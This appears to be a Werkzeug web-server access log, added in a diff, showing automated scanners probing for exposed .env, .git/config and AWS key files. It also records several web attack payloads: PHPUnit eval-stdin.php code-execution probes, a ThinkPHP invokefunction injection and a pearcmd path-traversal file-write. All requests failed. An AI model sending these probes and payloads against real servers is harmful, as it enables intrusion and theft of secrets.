+2024-06-11 14:32:57,568 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /test1.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,629 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /admin/test HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,688 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /app_dev.php/_profiler/phpinfo HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,745 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /application-dev.properties HTTP/1.0[0m" 404 -
+2024-06-11 14:32:58,314 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:58] "[33mGET /src/environments/environment.ts HTTP/1.0[0m" 404 -
+2024-06-11 14:32:58,374 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:58] "[33mGET /app.py HTTP/1.0[0m" 404 -
+2024-06-11 14:32:58,434 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:58] "[33mGET /env.js HTTP/1.0[0m" 404 -
+2024-06-11 14:32:58,753 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:58] "[33mGET /application.yml HTTP/1.0[0m" 404 -
+2024-06-11 14:32:59,069 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:59] "[33mGET /php_info HTTP/1.0[0m" 404 -
+2024-06-11 14:32:59,377 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:59] "[33mGET /package.json HTTP/1.0[0m" 404 -
+2024-06-11 14:32:59,436 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:59] "[33mGET /php-info.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:59,497 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:59] "[33mGET /assets/environment.json HTTP/1.0[0m" 404 -
+2024-06-11 14:32:59,558 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:59] "[33mGET /env.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,466 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /settings.py HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,527 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /vendor/src/app/app.component.ts HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,584 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /install/index.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,641 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /test2.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,698 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /app_dev.php/_profiler/empty/search/results HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,757 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /settings.json HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,819 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /in.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,878 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /php.ini HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,938 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /phpversion.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:00,998 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:00] "[33mGET /resources.py HTTP/1.0[0m" 404 -
+2024-06-11 14:33:01,058 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:01] "[33mGET /src/main/resources/application.properties HTTP/1.0[0m" 404 -
+2024-06-11 14:33:01,117 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:01] "[33mGET /static/.gitlab-ci.yml HTTP/1.0[0m" 404 -
+2024-06-11 14:33:01,174 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:01] "[33mGET /root/info.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:01,233 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:01] "[33mGET /index.php/myapp/admin.py HTTP/1.0[0m" 404 -
+2024-06-11 14:33:01,527 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:01] "[33mGET /resources/application.conf HTTP/1.0[0m" 404 -
+2024-06-11 14:33:02,597 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:02] "[33mGET /public/index.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:03,169 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:03] "[33mGET /settings-production.json HTTP/1.0[0m" 404 -
+2024-06-11 14:33:03,232 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:03] "[33mGET /debug/default HTTP/1.0[0m" 404 -
+2024-06-11 14:33:03,291 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:03] "[33mGET /.meteor/packages HTTP/1.0[0m" 404 -
+2024-06-11 14:33:03,349 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:03] "[33mGET /linusadmin-phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:03,653 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:03] "[33mGET /.aws/keypairs HTTP/1.0[0m" 404 -
+2024-06-11 14:33:04,723 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:04] "[33mGET /info/phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:05,250 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:05] "[33mGET /application-uat.yml HTTP/1.0[0m" 404 -
+2024-06-11 14:33:05,310 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:05] "[33mGET /composer.json HTTP/1.0[0m" 404 -
+2024-06-11 14:33:05,367 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:05] "[33mGET /public/info.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:06,191 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:06] "[33mGET /old_phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:08,078 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:08] "[33mGET /info_p.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:09,139 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:09] "[33mGET /web/phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:09,198 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:09] "[33mGET /app/etc/env.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:09,260 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:09] "[33mGET /infophp HTTP/1.0[0m" 404 -
+2024-06-11 14:33:10,349 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:10] "[33mGET /appsettings.Development.json HTTP/1.0[0m" 404 -
+2024-06-11 14:33:10,411 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:10] "[33mGET /public/test HTTP/1.0[0m" 404 -
+2024-06-11 14:33:10,472 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:10] "[33mGET /client/main.js HTTP/1.0[0m" 404 -
+2024-06-11 14:33:14,123 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:14] "[33mGET /ecosystem.config.js HTTP/1.0[0m" 404 -
+2024-06-11 14:33:15,209 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:15] "[33mGET /application/config/constants.php HTTP/1.0[0m" 404 -
+2024-06-11 14:33:15,269 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:15] "[33mGET /api/config/tsconfig.json HTTP/1.0[0m" 404 -
+2024-06-11 14:33:15,330 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:15] "[33mGET /config/config.ini HTTP/1.0[0m" 404 -
+2024-06-11 14:33:15,389 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:15] "[33mGET /config.json HTTP/1.0[0m" 404 -
+2024-06-11 14:33:18,730 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:18] "[33mGET /config/settings/test.py HTTP/1.0[0m" 404 -
+2024-06-11 14:33:21,489 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:21] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 14:33:25,899 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:33:25] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 14:44:53,237 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:44:53] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 14:44:54,829 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:44:54] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 14:57:21,017 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:57:21] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 16:23:46,528 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 16:23:46] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 16:41:22,512 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 16:41:22] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 16:41:22,581 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 16:41:22] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 17:09:31,870 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 17:09:31] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 17:34:42,626 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 17:34:42] "[33mGET /.git/config HTTP/1.0[0m" 404 -
+2024-06-11 17:49:48,579 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 17:49:48] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 18:13:24,530 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 18:13:24] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 18:13:25,148 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 18:13:25] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 18:19:41,179 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 18:19:41] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 18:34:11,501 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 18:34:11] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 18:34:11,566 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 18:34:11] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 18:38:56,980 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 18:38:56] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 18:53:45,981 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 18:53:45] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 19:13:57,480 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 19:13:57] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 20:03:27,140 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:03:27] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 20:03:27,847 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:03:27] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2024-06-11 20:18:36,655 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:18:36] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 20:18:36,734 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:18:36] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 20:31:03,450 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:31:03] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 20:31:04,683 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:31:04] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 20:37:00,334 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:00] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:07,319 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:07] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:16,039 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:16] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:24,998 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:24] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:27,668 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:27] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:30,457 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:30] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:39,263 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:39] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:49,024 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:49] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:37:58,188 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:37:58] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:38:08,078 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:38:08] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:38:17,301 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:38:17] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:38:26,801 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:38:26] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:38:35,145 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:38:35] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:38:38,499 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:38:38] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:38:47,811 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:38:47] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:38:57,306 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:38:57] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:39:06,871 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:39:06] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:39:17,541 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:39:17] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:39:25,975 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:39:25] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:39:35,107 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:39:35] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:39:46,122 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:39:46] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:39:48,223 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:39:48] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:39:53,600 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:39:53] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:40:02,734 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:40:02] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:40:12,311 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:40:12] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:40:22,197 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:40:22] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:40:31,776 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:40:31] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:40:41,285 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:40:41] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:40:51,944 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:40:51] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:40:57,144 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:40:57] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:41:00,515 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:41:00] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:41:10,834 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:41:10] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:41:20,045 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:41:20] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:41:28,396 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:41:28] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:41:38,306 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:41:38] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:41:47,495 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:41:47] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:41:57,304 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:41:57] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 20:42:06,496 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:42:06] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+2024-06-11 20:42:10,638 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:42:10] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+2024-06-11 20:42:13,634 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:42:13] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.0[0m" 404 -
+2024-06-11 20:42:16,061 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 20:42:16] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.0[0m" 404 -
+2024-06-11 21:40:00,249 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 21:40:00] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 21:40:00,348 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 21:40:00] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 22:30:32,517 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 22:30:32] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 23:40:52,954 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 23:40:52] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 23:40:58,120 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 23:40:58] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 23:41:28,719 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 23:41:28] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 23:41:28,793 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 23:41:28] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 23:53:56,058 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 23:53:56] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-12 00:27:28,652 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 00:27:28] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-12 00:27:28,784 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 00:27:28] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2024-06-12 00:35:47,849 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 00:35:47] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-12 00:44:51,183 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 00:44:51] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.0[0m" 404 -
+2024-06-12 01:07:37,448 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 01:07:37] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-12 02:19:39,005 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 02:19:39] "[33mGET /druid/index.html HTTP/1.0[0m" 404 -
+2024-06-12 02:41:41,012 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 02:41:41] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-12 02:41:41,072 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 02:41:41] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-12 02:42:27,444 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 02:42:27] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-12 03:08:30,218 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:08:30] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.0[0m" 404 -
+2024-06-12 03:52:06,835 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:06] "[33mGET /staging/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:07,062 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:07] "[33mGET /shop/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:07,430 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:07] "[33mGET /backend/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:07,466 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:07] "[33mGET /admin/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:08,165 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:08] "[33mGET /v2/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:08,192 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:08] "[33mGET /marketing/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:08,616 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:08] "[33mGET /payment/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:09,267 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:09] "[33mGET /help/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:22,138 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:22] "[33mGET /dashboard/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:52:23,338 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:52:23] "[33mGET /stage/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:28,565 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:28] "[33mGET /crm/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:29,369 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:29] "[33mGET /b2b/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:29,482 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:29] "[33mGET /app/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:30,010 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:30] "[33mGET /blog/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:30,425 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:30] "[33mGET /cms/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:30,453 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:30] "[33mGET /tools/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:32,925 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:32] "[33mGET /application/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:57:33,407 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:57:33] "[33mGET /test/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:58:20,545 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:58:20] "[33mGET /login/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:58:21,317 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:58:21] "[33mGET /register/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:58:36,932 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:58:36] "[33mGET /dev/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 03:58:38,066 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 03:58:38] "[33mGET /en/.git/config HTTP/1.0[0m" 404 -
+2024-06-12 04:34:31,480 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 04:34:31] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-12 04:34:31,569 - werkzeug - INFO - 127.0.0.1 - - [12/Jun/2024 04:34:31] "[33mPOST / HTTP/1.0[0m" 404 -
